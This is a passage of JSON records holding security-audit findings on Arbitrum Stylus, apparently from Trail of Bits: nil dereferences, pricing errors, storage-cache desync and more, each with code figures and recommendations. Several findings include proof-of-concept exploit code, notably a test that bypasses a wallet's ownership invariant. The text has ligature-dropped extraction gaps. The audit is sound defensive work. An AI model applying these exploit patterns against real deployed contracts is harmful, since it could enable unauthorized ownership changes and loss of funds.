            "Difficulty: Low"
        ]
    },
    {
        "title": "23. Potential nil dereference error in Node.Start ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "The Node.Start function may crash the node due to a nil dereference error. A nil dereference error can happen when Node.Start calls n.configFetcher.Get (gure 23.1). We assume that n.configFetcher can be nil, as suggested by the nil check at the end of the Node.Start function. If n.configFetcher is nil, a nil dereference error will occur when Node.Start calls the LiveConfig types Get method on it (gure 23.2). We have not determined whether n.configFetcher can actually be nil. func (n *Node) Start(ctx context.Context) error { // config is the static config at start, not a dynamic config config := n.configFetcher.Get() (...) if n.configFetcher != nil { n.configFetcher.Start(ctx) } return nil } Figure 23.1: stylus/arbnode/node.go#L999L1126 func (c *LiveConfig[T]) Get() T { c.mutex.RLock() defer c.mutex.RUnlock() return c.config } Figure 23.2: stylus/cmd/genericconf/liveconfig.go#L38L42 Recommendation Short term, verify whether n.configFetcher can be nil in the Node.Start function; if it cannot be nil, remove the nil check from the function, but if it can, refactor the code to handle that case.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "24. Incorrect dataPricer model update in ProgramKeepalive, causing lower cost and demand ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "When the ProgramKeepalive function calls the dataPricer.UpdateModel function, it passes in the number of program bytes in kilobytes instead of in bytes (gures 24.124.2). As a result, the computed demand and cost values in wei are lower than intended (gure 24.3). func (p Programs) ProgramKeepalive(codeHash common.Hash, time uint64) (*big.Int, error) { program, err := p.getProgram(codeHash, time) (...) cost, err := p.dataPricer.UpdateModel(program.asmEstimate.ToUint32(), time) Figure 24.1: stylus/arbos/programs/programs.go#L429L450 type Program struct { version initGas asmEstimate uint24 // Unit is a kb (predicted canonically) (...) uint16 uint24 Figure 24.2: stylus/arbos/programs/programs.go#L40L47 func (p *DataPricer) UpdateModel(tempBytes uint32, time uint64) (*big.Int, error) { demand, _ := p.demand.Get() (...) demand = arbmath.SaturatingUSub(demand, credit) demand = arbmath.SaturatingUAdd(demand, tempBytes) if err := p.demand.Set(demand); err != nil { return nil, err } (...) costInWei := arbmath.SaturatingUMul(costPerByte, uint64(tempBytes)) return arbmath.UintToBig(costInWei), nil } Figure 24.3: stylus/arbos/programs/data_pricer.go#L61L88 Note that when a program is activated, the DataPricer.UpdateModel is called correctly with the number of program bytes instead of kilobytes (stylus/arbos/programs/programs.go#L246L263). This is because it is called with the info.asmEstimate variable (from the activationInfo.asmEstimate eld), which is in bytes, instead of the estimateKb variable, which is in kilobytes and which is saved into the Program.asmEstimate eld. Exploit Scenario A chain owner sets a keepalive for a program, resulting in an incorrect data price model update and a cheaper execution of the keepalive function. Recommendations Short term, take the following actions:  Fix the ProgramKeepalive function so that it passes in the number of program bytes in bytes instead of kilobytes to the dataPrice.UpdateModel function. Note that this may require code changes in the ActivateProgram function as well so that both price model update calls receive the same value for the program bytes amount.  Change the name of the asmEstimate eld in the Program type to asmEstimateKb to prevent similar issues in the future (unless the eld is refactored to hold the number of bytes). Long term, add tests for this functionality.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "25. Machine does not properly handle WASM binaries with both Rust and Go support ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "The from_binaries function parses WASM modules from binaries that have either Rust or Go support; however, the function may detect both a Rust and Go binary at the same time (gure 25.1). This would cause an incorrect entrypoint code to be generated from both the Rust and Go support additions. A user could create a module that triggers both Rust and Go support by creating a function named run using the no_mangle attribute in a Rust program and compiling it to a WASM module. pub fn from_binaries(/* ... */) -> Result<Machine> { // Rust support let rust_fn = \"__main_void\"; if let Some(&f) = main_exports.get(rust_fn).filter(|_| runtime_support) { let expected_type = FunctionType::new([], [I32]); ensure!( main_module.func_types[f as usize] == expected_type, \"Main function doesn't match expected signature of [] -> [ret]\", ); entry!(@cross, u32::try_from(main_module_idx).unwrap(), f); entry!(Drop); entry!(HaltAndSetFinished); } // Go support if let Some(&f) = main_exports.get(\"run\").filter(|_| runtime_support) { let mut expected_type = FunctionType::default(); (...) // Launch main with an argument count of 1 and argv_ptr entry!(I32Const, 1); entry!(I32Const, argv_ptr); entry!(@cross, main_module_idx, f); (...) } Figure 25.1: stylus/arbitrator/prover/src/machine.rs#L1194L1260 Exploit Scenario A user creates a Rust program that includes a run function marked with the no_mangle attribute and compiles it to a WASM module to deploy it to the network. The user wastes funds deploying and activating the module, as it ends up being unusable due to the creation of incorrect entrypoint code during the WASM module parsing process. Recommendations Short term, have the from_binaries function check whether both Rust and Go support is included and, if so, error out the processing and inform the user that they cannot have both function names. Additionally, have the function log a message to inform the user whenever Rust or Go support is detected and that the entrypoint code has been instrumented as such. This will help users to understand how their code has been instrumented.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "26. Computation of internal stack hash uses wrong prex string ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "The prover::machine::Machine::stack_hashes function computes hashes of the co-thread frame stacks, value stacks, and internal stack using a prex string (gure 26.1). The value stack and the internal stack pass in the same prex (Value) to the hash computation macros, so certain sub-hashes of the value stack (first_hash, shown in the gure, and last_hash, omitted from the gure) may have the same value as the internal stack hash. This does not seem to create any security risk, but it seems that the prex for the internal stack was intended to be dierent from other stack prexes. fn stack_hashes(&self) -> (FrameStackHash, ValueStackHash, InterStackHash) { macro_rules! compute { ($stack:expr, $prefix:expr) => {{ let frames = $stack.iter().map(|v| v.hash()); hash_stack(frames, concat!($prefix, \" stack:\")) }}; } macro_rules! compute_multistack { ($field:expr, $stacks:expr, $prefix:expr, $hasher: expr) => {{ let first_elem = *$stacks.first().unwrap(); let first_hash = hash_stack( first_elem.iter().map(|v| v.hash()), concat!($prefix, \" stack:\"), ); // (...) - more code }}; } let frame_stacks = compute_multistack!(/* (...) */, \"Stack frame\",/* (...) */); let value_stacks = compute_multistack!(/* (...) */, \"Value\", /* (...) */); let inter_stack = compute!(self.internal_stack, \"Value\"); (frame_stacks, value_stacks, inter_stack) } Figure 26.1: stylus/arbitrator/prover/src/machine.rs#L2703L2767 Recommendations Change the prex used for the internal stack hash computation in the stack_hashes function to Internal. While this may not change any security property of the system, it will remove a possibility of a hash collision (between the internal stack hash and a partial hash from the value stack), which could create confusion if seen.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "27. WASI preview 1 may be incompatible with future versions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "Stylus was recently updated to use Go 1.21s WASI preview 1 for its WASM execution. (Previously, WASM was run through a JavaScript engine embedded in the Rust code.) However, since this iteration of WASI is only a preview and, according to a related issue on Gos GitHub repository, this interface is evolving without the insurance of backward compatibility, it may require additional eort to add support for WASI preview 2 and future WASI versions. Recommendations Long term, track the developments of support for WASI preview 2 in Go. Make sure to work around any version incompatibilities when updating the Stylus codebase to future WASI versions. References  WASI preview 2 meeting presentation (June 2022)  golang/go#65333: Go issue tracking WASI preview",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "28. Possible out-of-bounds write in strncpy function in Stylus C SDK ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "The strncpy function dened in the Stylus C SDK writes past the destination string when the source string (src) is shorter than the number of bytes (num) to write to the destination string (gure 28.1). This causes another area of the memory of the program to be overwritten, which may have various consequences depending on the program code and its memory layout. char *strncpy(char *dst, const char *src, size_t num) { size_t idx=0; while (idx<num && src[idx]!=0) { idx++; } memcpy(dst, src, idx); if (idx < num) { memset(dst+num, 0, num-idx); } return dst; } Figure 28.1: stylus/arbitrator/langs/c/src/simplelib.c#L6L16 This bug can be detected by compiling an example program using this function (gure 28.2) with ASan (by using the -fsanitize=address ag) with the GCC or Clang compiler. #include <stdio.h> #include <stdint.h> #include <stdlib.h> #include <string.h> char *mystrncpy(char *dst, const char *src, size_t num) { // code from Figure 28.1 } int main() { char buf[4] = {0}; mystrncpy(buf, \"ab\", 4); printf(\"buf='%s'\\n\", buf); } Figure 28.2: An example program that triggers the bug described in the nding Figure 28.3: Output from the example program, showing that it detects this issue Recommendations Short term, change the problematic line to memset(dst+idx, 0, num-idx); to prevent the issue described in this nding. Long term, implement tests for edge-case inputs for the Stylus SDK functions. References  strncpy manual page 29. Insu\u0000cient out-of-bounds check in memcpy utility function for ConstString Severity: Medium Diculty: High Type: Data Validation Finding ID: TOB-STYLUS-29 Target: stylus/arbitrator/langs/rust/stylus-sdk/src/abi/const_string.rs",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "30. Unused and unset timeouts in Arbitrator's JIT code ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "There are potential issues with timeouts in the Arbitrators JIT code: 1. Read and write operations for sockets created in the ready_hostio function (gure 30.1) have no timeouts. If the server the Arbitrator connects to does not send any data, the lack of timeout could result in a denial of service. 2. The ProcessEnv::child_timeout eld, which is set to 15 seconds (gure 30.2), is unused across the codebase. fn ready_hostio(env: &mut WasmEnv) -> MaybeEscape { {...omitted for brevity...} let socket = TcpStream::connect(&address)?; socket.set_nodelay(true)?; // no call to socket.set_{read,write}_timeout let mut reader = BufReader::new(socket.try_clone()?); Figure 30.1: stylus/arbitrator/jit/src/wavmio.rs#L198L303 impl Default for ProcessEnv { fn default() -> Self { Self { forks: false, debug: false, socket: None, last_preimage: None, timestamp: Instant::now(), child_timeout: Duration::from_secs(15), reached_wavmio: false, } } } Figure 30.2: stylus/arbitrator/jit/src/machine.rs#L331L342 Recommendations Short term, take the following actions:  Set timeouts for read and write operations for sockets created in the ready_hostio function.  Remove the Process::child_timeout eld or refactor the code to use it.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "31. New machine hashing format breaks backward compatibility ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "The new hashing format of the One Step Proof (OSP) contracts for the Stylus VM includes new hashing elds that break backward compatibility for the Nitro VM. The machine hash of the OSP contracts captures the entirety of the Stylus VMs state. function hash(Machine memory mach) internal pure returns (bytes32) { // Warning: the non-running hashes are replicated in Challenge if (mach.status == MachineStatus.RUNNING) { bytes32 valueMultiHash = mach.valueMultiStack.hash( mach.valueStack.hash(), mach.recoveryPc != NO_RECOVERY_PC ); bytes32 frameMultiHash = mach.frameMultiStack.hash( mach.frameStack.hash(), mach.recoveryPc != NO_RECOVERY_PC ); bytes memory preimage = abi.encodePacked( \"Machine running:\", valueMultiHash, mach.internalStack.hash(), frameMultiHash, mach.globalStateHash, mach.moduleIdx, mach.functionIdx, mach.functionPc, mach.recoveryPc, mach.modulesRoot ); return keccak256(preimage); } else if (mach.status == MachineStatus.FINISHED) { return keccak256(abi.encodePacked(\"Machine finished:\", mach.globalStateHash)); } else if (mach.status == MachineStatus.ERRORED) { return keccak256(abi.encodePacked(\"Machine errored:\")); } else if (mach.status == MachineStatus.TOO_FAR) { return keccak256(abi.encodePacked(\"Machine too far:\")); } else { revert(\"BAD_MACH_STATUS\"); } } Figure 31.1: The function that creates the hash for the Stylus VM (stylus-contracts/src/state/Machine.sol#4174) The hashing format of the Stylus VM has been updated from the format used to hash the Nitro VM, shown in gure 31.2; the new format includes multistacks (stacks of stacks) and a recovery program counter. function hash(Machine memory mach) internal pure returns (bytes32) { // Warning: the non-running hashes are replicated in Challenge if (mach.status == MachineStatus.RUNNING) { return keccak256( abi.encodePacked( \"Machine running:\", mach.valueStack.hash(), mach.internalStack.hash(), mach.frameStack.hash(), mach.globalStateHash, mach.moduleIdx, mach.functionIdx, mach.functionPc, mach.modulesRoot ) ); } else if (mach.status == MachineStatus.FINISHED) { return keccak256(abi.encodePacked(\"Machine finished:\", mach.globalStateHash)); } else if (mach.status == MachineStatus.ERRORED) { return keccak256(abi.encodePacked(\"Machine errored:\")); } else if (mach.status == MachineStatus.TOO_FAR) { return keccak256(abi.encodePacked(\"Machine too far:\")); } else { revert(\"BAD_MACH_STATUS\"); } } Figure 31.2: The function that creates the hash for the Nitro VM (https://etherscan.io/address/0x3E1f62AA8076000c3218493FE3e0Ae40bcB9A1DF#code) The discrepancy means that the Stylus VM upgrade will cause an inconsistent state between the hash of the Stylus VM and the previous Nitro VM hash, which is important to take into account when fraud proving is activated. Exploit Scenario Alice and Bob enter a challenge before the upgrade of the Stylus VM and OSP contracts. The upgrade occurs and causes a mismatch between the current and previous machine states, so the OSP cannot be run and Alice and Bob are both blocked from proving their state. Bob loses the challenge due to a timeout. Recommendations Short term, ensure that the fraud proving system is deactivated during the Stylus VM upgrade. Long term, thoroughly document the risks associated with breaking backward compatibility of the machine hash and whether/how the networks normal operation can be aected during an upgrade.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "32. Unclear handling of unexpected machine state transitions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "The OSP Machine contract does not handle unexpected state transitions when executing a single opcode in a consistent manner. In some cases (such as when setPc is called), the machine enters an errored state when an unexpected value type is found or when the program counter content contains unexpected data. function setPc(Machine memory mach, Value memory pc) internal pure { if (pc.valueType == ValueType.REF_NULL) { mach.status = MachineStatus.ERRORED; return; } if (pc.valueType != ValueType.INTERNAL_REF) { mach.status = MachineStatus.ERRORED; return; } if (!setPcFromData(mach, pc.contents)) { mach.status = MachineStatus.ERRORED; return; } } Figure 32.1: Unexpected data in the program counter leads to an errored state. (stylus-contracts/src/state/Machine.sol#124137) The internal setPcFromData function enters an early return condition and does not update the machine state when unexpected data is present. function setPcFromData(Machine memory mach, uint256 data) internal pure returns (bool) { if (data >> 96 != 0) { return false; } mach.functionPc = uint32(data); mach.functionIdx = uint32(data >> 32); mach.moduleIdx = uint32(data >> 64); return true; } Figure 32.2: The internal setPcFromData function (stylus-contracts/src/state/Machine.sol#92101) In other cases (such as when the machine is recovering from an errored state and setPcFromRecovery fails), this unexpected case is simply ignored. if (mach.status == MachineStatus.ERRORED && mach.recoveryPc != MachineLib.NO_RECOVERY_PC) { // capture error, recover into main thread. mach.switchCoThreadStacks(); mach.setPcFromRecovery(); mach.status = MachineStatus.RUNNING; } Figure 32.3: A failure in setting the program counter is ignored in mach.setPcFromRecovery. (stylus-contracts/src/osp/OneStepProofEntry.sol#135140) function setPcFromRecovery(Machine memory mach) internal pure returns (bool) { if (!setPcFromData(mach, uint256(mach.recoveryPc))) { return false; } mach.recoveryPc = NO_RECOVERY_PC; return true; } Figure 32.4: The internal setPcFromRecovery function returns a Boolean value indicating an unexpected state. (stylus-contracts/src/state/Machine.sol#103109) In other cases (such as when assumeI32 is called in executeCrossModuleInternalCall), the unexpected value is handled through a require check, which essentially blocks the execution of the OSP. function executeCrossModuleInternalCall( Machine memory mach, Module memory mod, Instruction calldata inst, bytes calldata proof ) internal pure { // Get the target from the stack uint32 internalIndex = uint32(inst.argumentData); uint32 moduleIndex = mach.valueStack.pop().assumeI32(); Figure 32.5: An unexpected state transition cannot be executed. (stylus-contracts/src/osp/OneStepProver0.sol#167175) function assumeI32(Value memory val) internal pure returns (uint32) { uint256 uintval = uint256(val.contents); require(val.valueType == ValueType.I32, \"NOT_I32\"); require(uintval < (1 << 32), \"BAD_I32\"); return uint32(uintval); } Figure 32.6: The assumeI32 function requires the value to be of the expected data format and blocks execution otherwise. (stylus-contracts/src/state/Value.sol#3136) In order to have a clearly dened incident response plan, unexpected state transitions should be handled consistently. Recommendations Short term, have the machine handle all listed unexpected machine state transitions from the OSP in the same way (e.g., by transitioning into an errored state). Long term, document all the invalid state transitions across components and decide on a sound and safe strategy to handle them.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "33. Potential footguns and attack vectors due to new memory model ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "The Stylus memory model introduces new concepts that might be surprising to developers who are familiar with the EVM model; these new concepts could also introduce potential attack vectors. The Stylus memory model uses a global memory model, in which each new memory page allocation is priced exponentially given the number of pages shared across all user programs. This is in contrast to the EVM, which prices memory quadratically and independently of other programs/contracts use of memory. With certain patterns (e.g., ERC-4337 UserOperation forwarding/relaying), it may be essential to have predictable costs for memory expansion in the current context in order to ensure that relayed calls are executed with the conditions the original signer intended. Because a relayed call typically involves handling memory, these costs must be taken into account for the outer call that wraps the inner call. If these costs can be inuenced by previous user programs allocating a large number of memory pages, it might open up new attack vectors. Exploit Scenario A relaying contract wraps an inner call with a xed amount of gas. The inner call requires memory allocation. Because the outer call can open an arbitrary number of memory pages, the inner call fails unexpectedly due to the increased gas cost of global memory allocation. Recommendations Long term, make developers aware of any deviation from the EVM model and its potential security considerations.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "34. Storage cache can become out of sync for reentrant and delegated calls ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "A storage caches known values can become out of sync, causing storage reads to be outdated and storage write operations to be omitted. Storage caches take into account only their current call context. Every Stylus program call creates a new EVM API requestor (EvmApiRequestor). #[no_mangle] pub unsafe extern \"C\" fn stylus_call( module: GoSliceData, calldata: GoSliceData, config: StylusConfig, req_handler: NativeRequestHandler, evm_data: EvmData, debug_chain: u32, output: *mut RustBytes, gas: *mut u64, ) -> UserOutcomeKind { let module = module.slice(); let calldata = calldata.slice().to_vec(); let compile = CompileConfig::version(config.version, debug_chain != 0); let evm_api = EvmApiRequestor::new(req_handler); let pricing = config.pricing; let output = &mut *output; let ink = pricing.gas_to_ink(*gas); // ... } Figure 34.1: A call to a Stylus program creates a new EVM API requestor. (stylus/arbitrator/stylus/src/lib.rs#169205) When a new EVM API requestor is created, a new StorageCache struct is created as well. impl<D: DataReader, H: RequestHandler<D>> EvmApiRequestor<D, H> { pub fn new(handler: H) -> Self { Self { handler, last_code: None, last_return_data: None, storage_cache: StorageCache::default(), } } Figure 34.2: A new storage cache is created. (stylus/arbitrator/arbutil/src/evm/req.rs#2836) When there is no need to share storage state between two calls, storage caches can operate independently of each other without any issues. However, in the EVM contract, storage state is shared for delegated and reentrant calls. A call that would share storage state would also create a new storage cache struct, which can cause the rst storage cache to become out of sync when the second cache modies some of the rst caches known values. Known values are those that the storage cache thinks are located in the state trie. Such situations could cause storage reads to be incorrect or outdated and write operations to be omitted. Exploit Scenario A multisignature Stylus program SmartWallet allows arbitrary program execution with one important invariant: the ownership of the program is not allowed to change after the execution of the inner call (gure 34.3). Because the inner call is a reentrant call, the storage cache becomes out of sync; this causes the ownership invariant check to be faulty, allowing it to be bypassed (gures 34.434.5). #![no_main] use stylus_sdk::{ alloy_primitives::Address, call::RawCall, console, stylus_proc::{entrypoint, external, sol_storage}, }; extern crate alloc; #[global_allocator] static ALLOC: mini_alloc::MiniAlloc = mini_alloc::MiniAlloc::INIT; sol_storage! { #[entrypoint] pub struct SmartWallet { address owner; bool initialized; } } #[external] impl SmartWallet { pub fn owner(&self) -> Result<Address, String> { Ok(self.owner.get()) } pub fn initialize(&mut self, owner: Address) -> Result<(), String> { if self.initialized.get() { return Err(\"Already initialized\".into()); } self.owner.set(owner); self.initialized.set(true); Ok(()) } pub fn execute(&mut self, args: Vec<u8>) -> Result<Vec<u8>, Vec<u8>> { // ... some multisig access controls let previous_owner = self.owner.get(); let mut args = &args[..]; let mut take_args = |n_bytes: usize| -> &[u8] { let value = &args[..n_bytes]; args = &args[n_bytes..]; value }; let kind = take_args(1)[0]; let addr = Address::try_from(take_args(20)).unwrap(); let raw_call = match kind { 0 => RawCall::new(), 1 => RawCall::new_delegate(), 2 => RawCall::new_static(), x => panic!(\"unknown call kind {x}\"), }; let return_data = raw_call.call(addr, args)?; assert_eq!( previous_owner, self.owner.get(), \"Owner cannot change during `execute` call\" ); Ok(return_data) } } Figure 34.3: A multisignature wallet that includes an invariant that the program ownership must not change after the execution of the inner call func TestProgramSmartWalletPoc(t *testing.T) { t.Parallel() testSmartWalletPoc(t, true) } func testSmartWalletPoc(t *testing.T, jit bool) { builder, auth, cleanup := setupProgramTest(t, jit) ctx := builder.ctx l2info := builder.L2Info l2client := builder.L2.Client defer cleanup() ownerAddress := l2info.GetAddress(\"Owner\") programAddr := deployWasm(t, ctx, auth, l2client, \"../arbitrator/stylus/tests/storage-poc/target/wasm32-unknown-unknown/release/storag e-poc.wasm\") storageAddr := deployWasm(t, ctx, auth, l2client, rustFile(\"storage\")) colors.PrintGrey(\"storage.wasm colors.PrintGrey(\"storage-poc.wasm \", programAddr) \", storageAddr) programsAbi := `[{\"type\":\"function\",\"name\":\"execute\",\"inputs\":[{\"name\":\"args\",\"type\":\"uint8[]\"}],\"o utputs\":[],\"stateMutability\":\"nonpayable\"},{\"type\":\"function\",\"name\":\"initialize\",\"i nputs\":[{\"name\":\"owner\",\"type\":\"address\",\"internalType\":\"address\"}],\"outputs\":[],\"st ateMutability\":\"nonpayable\"},{\"type\":\"function\",\"name\":\"owner\",\"inputs\":[],\"outputs\" :[{\"name\":\"\",\"type\":\"uint256\",\"internalType\":\"uint256\"}],\"stateMutability\":\"view\"}]` callOwner, _ := util.NewCallParser(programsAbi, \"owner\") callInitialize, _ := util.NewCallParser(programsAbi, \"initialize\") callExecute, _ := util.NewCallParser(programsAbi, \"execute\") ensure := func(tx *types.Transaction, err error) *types.Receipt { t.Helper() Require(t, err) receipt, err := EnsureTxSucceeded(ctx, l2client, tx) Require(t, err) return receipt } pack := func(data []byte, err error) []byte { Require(t, err) return data } assertProgramOwnership := func() { args, _ := callOwner() returnData := sendContractCall(t, ctx, programAddr, l2client, args) newOwner := common.BytesToAddress(returnData) if ownerAddress == newOwner { colors.PrintRed(\"Ownership remains\") } else { Fatal(t, \"Owner changed\", ownerAddress, newOwner) } } tx := l2info.PrepareTxTo(\"Owner\", &programAddr, 1e9, nil, pack(callInitialize(ownerAddress))) ensure(tx, l2client.SendTransaction(ctx, tx)) // \"Owner\" remains the owner of the program. assertProgramOwnership() key := common.Hash{} value := common.HexToHash(\"0xdead\") args := []uint8{} args = append(args, 0x01) args = append(args, storageAddr.Bytes()...) // storage address args = append(args, 0x01) args = append(args, key.Bytes()...) args = append(args, value.Bytes()...) // storage write op // key // value // delegatecall tx = l2info.PrepareTxTo(\"Owner\", &programAddr, 1e9, nil, pack(callExecute(args))) ensure(tx, l2client.SendTransaction(ctx, tx)) // This passes // The `owner` address has been modified through the call to `execute`. assertStorageAt(t, ctx, l2client, programAddr, key, value) // This fails // \"Owner\" is not the owner of the program anymore. assertProgramOwnership() validateBlocks(t, 1, jit, builder) } Figure 34.4: The Go system test, which is able to bypass SmartWallets ownership invariant go test ./system_tests/... -run ^TestProgramSmartWalletPoc$ ... Ownership remains ... --- FAIL: TestProgramSmartWalletPoc (0.81s) program_test.go:1096: [Owner changed 0x26E554a8acF9003b83495c7f45F06edCB803d4e3 0x000000000000000000000000000000000000dEaD] FAIL FAIL FAIL github.com/offchainlabs/nitro/system_tests 1.735s Figure 34.5: The program ownership is changed. Recommendations Short term, modify the associated code so that the storage caches values are committed beforehand whenever delegated or reentrant calls are possible. Alternatively, consider sharing storage caches between call frames. However, the second option will likely come with signicant code ineciencies and overhead. Long term, thoroughly document the intended behavior of the cache, including whether it should persist across calls and any potentially unsafe uses for Stylus developers.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "35. Storage cache can be written to in a static call context ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "The storage cache can be written to inside of a static call context, which can lead to confusing and unexpected behavior. The storage cache is intended to minimize storage read and write operations. When the storage cache is ushed, only the values that have changed from the known values (i.e., values that are dirty) are committed to the persistent storage state, via the EvmApiMethod::SetTrieSlots method. fn flush_storage_cache(&mut self, clear: bool, gas_left: u64) -> Result<u64> { let mut data = Vec::with_capacity(64 * self.storage_cache.len() + 8); data.extend(gas_left.to_be_bytes()); for (key, value) in &mut self.storage_cache.slots { if value.dirty() { data.extend(*key); data.extend(*value.value); value.known = Some(value.value); } } if clear { self.storage_cache.clear(); } if data.len() == 8 { return Ok(0); // no need to make request } let (res, _, cost) = self.request(EvmApiMethod::SetTrieSlots, data); if res[0] != EvmApiStatus::Success.into() { bail!(\"{}\", String::from_utf8_or_hex(res)); } Ok(cost) } Figure 35.1: Only dirty values are committed to persistent state when the storage cache is ushed. (stylus/arbitrator/arbutil/src/evm/req.rs#122145) Values that are not dirty do not result in EvmApiMethod::SetTrieSlots requests. In order for a value to be known, it must be either retrieved from Geth via the GetBytes32 EVM API method or committed by the storage cache itself via the SetTrieSlots EVM API method. This means that a get request can change the behavior of a subsequent storage cache ush host I/O operation, leading to strange and unexpected behavior inside a static call context where persistent state changes are not permitted. Exploit Scenario Inside of a static call context, storage writes are not allowed. However, writing multiple values to the storage cache is allowed if they end up equaling the known values. #![no_main] use stylus_sdk::{ alloy_primitives::{B256, U256}, call::RawCall, console, contract, msg, storage::{GlobalStorage, StorageCache}, stylus_proc::entrypoint, }; extern crate alloc; #[global_allocator] static ALLOC: mini_alloc::MiniAlloc = mini_alloc::MiniAlloc::INIT; #[entrypoint] fn user_main(_input: Vec<u8>) -> Result<Vec<u8>, Vec<u8>> { let slot = U256::from(0); let get = |slot| { let value = StorageCache::get_word(slot); console!(\"StorageCache::get_word({slot}) -> {value}\"); }; let set = |slot, value| { console!(\"StorageCache::set_word({slot}, {value})\"); unsafe { StorageCache::set_word(slot, value) }; }; let flush = || { console!(\"StorageCache::flush()\"); StorageCache::flush(); }; if msg::reentrant() { get(slot); // If this line is removed, the staticcall fails. // Inside staticcall context. set(slot, B256::new([0xaa; 32])); set(slot, B256::new([0xbb; 32])); set(slot, B256::new([0x00; 32])); flush(); } else { // Make reentrant static call. let address = contract::address(); unsafe { RawCall::new_static().call(address, &[])? }; } Ok(vec![]) } Figure 35.2: The static call fails if a previous GetBytes32 EVM API request is removed. Recommendations Short term, consider forbidding writes to the storage cache inside of a static call context. This is especially important if the storage cache is to be shared among reentrant calls, as explained in the issue TOB-STYLUS-34, as a static call should not be able to inuence another calls behavior through shared state (aside from gas costs). Long term, be aware of optimizations that could lead to strange and confusing patterns when interacting with the system on a higher level.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "36. Revert conditions always override user returned status ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
        "body": "Certain corner conditions in Stylus program execution can cause valid executions to be agged as reverts. Once a Stylus program exits early, the early_exit ag is used to indicate that early should be set as the exit code in the program_internal__set_done function (gure 36.1). #[no_mangle] pub unsafe extern \"C\" fn program_internal__set_done(mut status: UserOutcomeKind) -> u32 { use UserOutcomeKind::*; let program = Program::current(); let module = program.module; let mut outs = program.outs.as_slice(); let mut ink_left = program_ink_left(module); // apply any early exit codes if let Some(early) = program.early_exit { status = early; } // check if instrumentation stopped the program if program_ink_status(module) != 0 { status = OutOfInk; outs = &[]; ink_left = 0; } if program_stack_left(module) == 0 { status = OutOfStack; outs = &[]; ink_left = 0; } let gas_left = program.config.pricing.ink_to_gas(ink_left); let mut output = Vec::with_capacity(8 + outs.len()); output.extend(gas_left.to_be_bytes()); output.extend(outs); program .request_handler() .set_request(status as u32, &output) } Figure 36.1: The program_internal__set_done function in arbitrator/wasm-libraries/user-host/src/link.rs#L194L228 However, this function can override the status returned for program executions if either the ink amount or the stack size is zero, agging them as reverts. Both of these conditions can be reached if a program exits early. Exploit Scenario Alice optimizes a Stylus program execution to use exactly a certain amount of ink in the context of a larger DeFi system executing untrusted calls. Her program is called with the exact amount of ink required to run, so it exits with zero ink left. However, the execution is agged as a revert. Recommendations Short term, consider changing the program_internal__set_done function so that valid executions resulting in zero gas are not automatically agged as reverts, making sure the common out-of-gas and out-of-stack executions are handled correctly. Long term, review the local and global invariants behind each component to make sure corner cases are correctly dened and handled.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "37. CacheManager bids cannot be increased ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-05-offchain-arbitrumstylus-securityreview.pdf",
